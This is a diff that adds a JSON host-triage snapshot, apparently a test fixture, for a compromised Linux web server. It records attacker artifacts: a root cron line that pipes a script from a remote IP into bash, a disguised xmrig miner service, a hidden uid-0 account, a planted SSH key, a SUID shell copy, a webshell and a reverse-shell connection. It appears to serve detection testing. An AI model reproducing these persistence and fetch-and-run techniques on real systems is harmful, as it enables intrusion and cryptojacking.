@@ -1,0 +1,39 @@
+{
+  "meta": {"os": "linux", "hostname": "web01", "collected_at": "2026-10-06T10:30:00", "collector_version": "1.0"},
+  "users": [
+    {"name": "root", "uid": 0, "is_admin": true, "shell": "/bin/bash"},
+    {"name": "www-data", "uid": 33, "is_admin": false, "shell": "/usr/sbin/nologin"},
+    {"name": "support", "uid": 0, "is_admin": true, "shell": "/bin/bash"}
+  ],
+  "services": [
+    {"name": "nginx", "display": "nginx", "state": "Running", "start_mode": "enabled", "binary_path": "/usr/sbin/nginx", "run_as": "root"},
+    {"name": "sysupdate", "display": "sysupdate", "state": "Running", "start_mode": "enabled", "binary_path": "/tmp/.x/xmrig", "run_as": "root"}
+  ],
+  "tasks": [],
+  "cron": [
+    {"user": "root", "line": "* * * * * curl -s http://185.220.101.44/x.sh | bash", "file": "/var/spool/cron/crontabs/root"}
+  ],
+  "autoruns": [
+    {"location": "/etc/systemd/system/sysupdate.service", "name": "sysupdate", "value": "/tmp/.x/xmrig -o stratum+tcp://185.220.101.44:3333"}
+  ],
+  "ssh_authorized_keys": [
+    {"user": "root", "file": "/root/.ssh/authorized_keys", "key_fingerprint_or_line": "ssh-rsa AAAAB3NzaC1yc2attacker root@evil"}
+  ],
+  "suid_files": ["/usr/bin/passwd", "/usr/bin/sudo", "/tmp/rootbash"],
+  "remote_access_tools": [],
+  "hosts_file": [],
+  "listening_ports": [
+    {"proto": "tcp", "addr": "0.0.0.0", "port": 80, "pid": 700, "process": "nginx"},
+    {"proto": "tcp", "addr": "0.0.0.0", "port": 22, "pid": 640, "process": "sshd"}
+  ],
+  "connections": [
+    {"proto": "tcp", "laddr": "10.20.0.10", "lport": 51020, "raddr": "185.220.101.44", "rport": 4444, "pid": 1400, "process": "bash"},
+    {"proto": "tcp", "laddr": "10.20.0.10", "lport": 51044, "raddr": "185.220.101.44", "rport": 3333, "pid": 1502, "process": "xmrig"}
+  ],
+  "recent_modified": [
+    {"path": "/var/www/html/uploads/shell.php", "mtime": "2026-10-06T10:01:40"},
+    {"path": "/tmp/.x/xmrig", "mtime": "2026-10-06T10:11:30"},
+    {"path": "/tmp/rootbash", "mtime": "2026-10-06T10:06:24"}
+  ],
+  "errors": []
+}
